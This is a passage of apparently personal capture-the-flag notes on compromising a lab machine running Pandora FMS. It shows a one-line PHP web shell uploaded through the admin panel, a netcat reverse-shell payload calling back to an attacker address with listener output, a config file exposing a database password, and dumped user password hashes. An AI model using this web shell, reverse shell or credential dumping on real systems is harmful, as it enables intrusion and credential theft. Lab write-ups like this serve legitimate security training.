Using the Pandora FMS admin functionality, add a php rce file
```php
# rce.php contents:
<?php system($_REQUEST['cmd']); ?>
```

![[Pasted image 20220420232959.png]]
Then navigate to the file manually and execute commands
![[Pasted image 20220420233050.png]]
Use this payload URL encoded to catch a reverse shell as matt
```bash
# payload
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9001>/tmp/f

# listener
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.136] 54648
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")' 
matt@pandora:/var/www/pandora/pandora_console/images/test_dir$
```
*Note there is now a key for matt's user*
```php
# db stuff from config
?php
// File generated by centos kickstart
$config["dbtype"] = "mysql";            
$config["dbname"]="pandora";            
$config["dbuser"]="pandora";            
$config["dbpass"]="PandoraFMSSecurePass2021";
$config["dbhost"]="localhost";                  
$config["homedir"]="/var/www/pandora/pandora_console";
$config["homeurl"]="/pandora_console";  
error_reporting(0); 
$ownDir = dirname(__FILE__) . '/';
include ($ownDir . "config_process.php");
?>

```
```sql
-- FROM DB
+---------+----------------------------------+
| id_user | password                         |
+---------+----------------------------------+
| admin   | ad3f741b04bd5880fb32b54bc4f43d6a |
| daniel  | 76323c174bd49ffbbdedf678f6cc89a6 |
| matt    | f655f807365b6dc602b31ab3d6d43acc |
+---------+----------------------------------+
```
